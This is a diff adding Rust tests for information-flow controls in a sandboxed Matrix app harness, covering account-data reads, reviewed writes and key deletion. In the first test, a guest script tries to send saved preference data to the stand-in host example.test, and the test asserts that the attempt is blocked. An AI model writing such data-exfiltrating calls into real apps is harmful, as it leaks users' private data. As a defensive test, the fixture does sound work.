@@ -1742,6 +1742,89 @@ fn explicit_account_profile_reads_remain_private_and_record_untrusted_influence(
 }
 
 #[test]
+fn saved_account_data_reads_stay_private_and_record_untrusted_influence() {
+    let mut host = Harness::new();
+    let (_, context) = host.launch("notes-sync", false, r#"
+        host.request("matrix.account_data", {keys: ["prefs", "layout", "prefs"]}, fn(r) {
+            let saved = r.data.items[0]
+            let layout = if r.data.items[1].content.is_nil() {"unsaved"} else {"saved"}
+            host.request("network.http", {url:"https://example.test/" body:saved.key + ":" + saved.content.theme + ":" + layout}, fn(out) {
+                host.request("notify.post", {body:if out.is_ok {"escaped"} else {"saved data stays private"}})
+            })
+        })
+        Label{text:"fixture"}
+    "#);
+    let (reply, call) = stock_matrix_requests(&mut host, 1).pop().unwrap();
+    let services::MatrixServiceCall::AccountData { keys, is_batch: true } = &call else { panic!("expected one batched saved-data read") };
+    assert_eq!(keys, &["prefs", "layout"], "keys are deduped in asked order");
+    {
+        let flow = host.flow.borrow();
+        assert!(flow.labels(&context).unwrap().contains(&Source::Account { account: ACCOUNT.into() }));
+        assert!(flow.influences(&context).unwrap().contains(&Influence::Unknown), "another device or client may have written it");
+    }
+    host.reply(reply, &matrix_fixture(&call).to_string());
+    assert!(host.process().into_iter().all(|ask| !matches!(ask, BrokerAsk::Network { .. })));
+    assert_eq!(host.notifications(), ["saved data stays private"]);
+    assert_eq!(host.attempted_bodies.borrow().as_slice(), ["prefs:dark:unsaved"], "the guest read both items of the reply");
+}
+
+#[test]
+fn saving_room_text_to_account_data_is_reviewed_with_the_exact_saved_value() {
+    let mut host = Harness::new();
+    host.review_effects = true;
+    host.launch("notes-sync", false, r#"
+        host.request("matrix.read_messages", {}, fn(r) {
+            host.request("matrix.set_account_data", {key: "draft" content: {text: r.data.messages[0].body}}, fn(out) {
+                host.request("notify.post", {body:if out.is_ok {"saved " + out.data.key} else {out.error}})
+            })
+        })
+        Label{text:"fixture"}
+    "#);
+    let read = matrix_reply(host.process());
+    host.reply(read, r#"{"messages":[{"body":"Room text to keep"}]}"#);
+    let (request, review) = effect_review(host.process());
+    assert_eq!(request.service, "matrix.set_account_data");
+    assert!(!review.allowed);
+    assert_eq!(review.recipient, Some(Recipient::NetworkOrigin("https://homeserver.test".into())));
+    assert_eq!(review.action, Some(a2app_core::information_flow::SensitiveAction {
+        kind: "matrix.account.data.write".into(), target: a2app_core::account_data::WRITE_TARGET.into() }));
+    assert!(review.denied_sources.contains(&Source::Room { account: ACCOUNT.into(), room: ROOM.into() }),
+        "room text reaches the homeserver only with the user's approval");
+    assert!(review.influences.contains(&Influence::RoomContent { account: ACCOUNT.into(), room: ROOM.into() }));
+    let saved = serde_json::json!({"text":"Room text to keep"});
+    assert_eq!(serde_json::from_str::<serde_json::Value>(&review.payload).unwrap(),
+        a2app_core::account_data::write_payload("draft", Some(&saved)), "the review shows exactly what is saved");
+    host.flow.borrow_mut().approve_effect_once(&review).unwrap();
+    let writes: Vec<_> = host.dispatch(Some(request)).into_iter().filter_map(|ask| match ask {
+        BrokerAsk::Matrix { reply, call, .. } => Some((reply, call)),
+        BrokerAsk::Used { .. } => None,
+        _ => panic!("an approved save only reaches the Matrix worker"),
+    }).collect();
+    assert_eq!(writes.len(), 1);
+    let (reply, call) = writes.into_iter().next().unwrap();
+    let services::MatrixServiceCall::SetAccountData { key, content } = &call else { panic!("expected a saved-data write") };
+    assert_eq!((key.as_str(), content.as_ref()), ("draft", Some(&saved)));
+    host.reply(reply, &matrix_fixture(&call).to_string());
+    assert_eq!(host.notifications(), ["saved draft"]);
+}
+
+#[test]
+fn a_nil_content_reaches_the_worker_as_a_delete() {
+    let mut host = Harness::new();
+    host.launch("notes-sync", false, r#"
+        host.request("matrix.set_account_data", {key: "prefs" content: nil}, fn(out) {
+            host.request("notify.post", {body:if out.is_ok {"deleted " + out.data.key} else {out.error}})
+        })
+        Label{text:"fixture"}
+    "#);
+    let (reply, call) = stock_matrix_requests(&mut host, 1).pop().unwrap();
+    assert!(matches!(&call, services::MatrixServiceCall::SetAccountData { key, content: None } if key == "prefs"),
+        "Splash sends a nil field as null, which deletes the key");
+    host.reply(reply, &matrix_fixture(&call).to_string());
+    assert_eq!(host.notifications(), ["deleted prefs"]);
+}
+
+#[test]
 fn public_fetch_builtin_runs_with_real_vm_and_host_callback() {
     let stock = a2app_core::builtin::stock("public-web").expect("public worker sample is installed");
     let mut cx = Cx::new(Box::new(|_, _| {}));
